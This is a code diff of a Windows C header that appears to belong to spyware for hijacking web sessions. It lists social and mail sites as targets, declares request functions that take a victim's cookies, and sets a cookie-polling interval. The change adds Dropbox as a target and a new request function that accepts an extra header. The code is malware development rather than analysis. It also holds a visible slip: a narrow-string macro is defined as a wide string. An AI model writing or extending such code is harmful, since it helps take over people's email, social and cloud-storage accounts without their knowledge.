@@ -3,20 +3,23 @@
 #include <Windows.h>
 #pragma pack(1)
 
-#define SOCIAL_ENTRY_COUNT 8
+#define SOCIAL_ENTRY_COUNT 12
 
 #define FACEBOOK_DOMAIN L"facebook.com" // FIXME array-izza!
 #define GMAIL_DOMAIN	L"mail.google.com"
 #define YAHOO_DOMAIN	L"yahoo.com"
 #define TWITTER_DOMAIN	L"twitter.com"
 #define OUTLOOK_DOMAIN	L"live.com"
+#define DROPBOX_DOMAIN  L"dropbox.com"
+#define DROPBOX_DOMAINWWW  L"www.dropbox.com"
 
 #define FACEBOOK_DOMAINA	"facebook.com"
 #define GMAIL_DOMAINA		"mail.google.com"
 #define YAHOO_DOMAINA		"yahoo.com"
 #define TWITTER_DOMAINA		"twitter.com"
 #define OUTLOOK_DOMAINA		"live.com"
-
+#define DROPBOX_DOMAINA     "dropbox.com"
+#define DROPBOX_DOMAINWWWA  L"www.dropbox.com"
 
 #ifndef _DEBUG
 #define SLEEP_COOKIE 30 // In secondi
@@ -128,6 +131,18 @@ DWORD XmlHttpSocialRequest(
 	__out DWORD *dwRespSize, 
 	__in LPSTR strCookies,
 	__in LPWSTR strReferer);
+
+DWORD HttpSocialRequestWithAdditionalHeader(
+	__in LPWSTR strHostName, 
+	__in LPWSTR strHttpVerb, 
+	__in LPWSTR strHttpRsrc, 
+	__in DWORD dwPort, 
+	__in LPBYTE *lpSendBuff, 
+	__in DWORD dwSendBuffSize, 
+	__out LPBYTE *lpRecvBuff, 
+	__out DWORD *dwRespSize, 
+	__in LPSTR strCookies,
+	__in_opt LPWSTR strAdditionalHeader);
 
 DWORD HttpSocialRequest(
 	__in LPWSTR strHostName, 
